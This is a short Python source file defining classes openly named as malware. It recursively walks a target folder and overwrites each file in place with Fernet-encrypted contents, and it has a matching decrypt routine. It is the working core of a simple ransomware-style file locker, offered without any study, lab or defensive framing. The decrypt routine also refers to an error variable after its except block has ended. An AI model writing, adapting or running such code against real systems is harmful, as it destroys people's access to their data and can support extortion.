# Import Section
from cryptography.fernet import Fernet
from os import listdir, path

# Classes

## Malware Class (Base Class | Parent Class)
class Malware:
    ### Constructor
    def __init__(self, Target_Path):
        self.Path = Target_Path
        
        self.Error_Count = 0
        self.Success_Count = 0
        
        self.Files = list()
        self.Locations = list()
    
    ### Method for Finding all files and subfolders within a target Folder
    def Recurse_Dir(self, Path):
        for Item in listdir(Path):
            Abs_Path = path.join(Path, Item)
            
            if path.isdir(Abs_Path):
                self.Locations.append(Abs_Path)
                self.Recurse_Dir(Abs_Path)
            
            elif path.isfile(Abs_Path):
                self.Files.append(Abs_Path)

    ### Method for printing the status | mainly used after execution of main program to see how many folders
    ### and/or files are affected and not affected 
    def Print_Stat(self):
        print(f"Total      : {self.Success_Count + self.Error_Count}")
        print(f"Successful : {self.Success_Count}")
        print(f"Errors     : {self.Error_Count}")

## Encrypt Class
class Encrypt(Malware):
    ### Constructor
    def __init__(self, Target_Path, Key):
        #### calls the constructor of parent class
        super().__init__(Target_Path)
        
        self.Key = Key
        self.Crypt = Fernet(Key)
    
    ### Method for encrypting a file
    def Encrypt_File(self, Abs_Path):
        with open(Abs_Path, 'rb') as File_Obj:
            Data = File_Obj.read()

        Encrypted = self.Crypt.encrypt(Data)
        
        with open(Abs_Path, 'wb') as File_Obj:
            File_Obj.write(Encrypted)
    
    ### Main method to execute for this class
    def Main(self):
        self.Recurse_Dir(self.Path)
        
        for File in self.Files:
            try:
                self.Encrypt_File(File)
                self.Success_Count += 1
                
            except PermissionError:
                self.Error_Count += 1

        self.Print_Stat()

## Decrypt Class
class Decrypt(Malware):
    ### Constructor
    def __init__(self, Target_Path, Key):
        #### calling the constructor of the parent class
        super().__init__(Target_Path)
        
        self.Key = Key
        self.Crypt = Fernet(Key)
    
    ### Method for decrypting a file
    def Decrypt_File(self, Abs_Path):
        with open(Abs_Path, 'rb') as File_Obj:
            Data = File_Obj.read()

        Decrypted = self.Crypt.decrypt(Data)
        
        with open(Abs_Path, 'wb') as File_Obj:
            File_Obj.write(Decrypted)
    
    ### Main method to execute for this class
    def Main(self):
        self.Recurse_Dir(self.Path)
        
        for File in self.Files:
            try:
                self.Decrypt_File(File)
                self.Success_Count += 1
                
            except Exception as Error:
                self.Error_Count += 1

        if self.Error_Count > 0:
            print(Error)
            
        self.Print_Stat()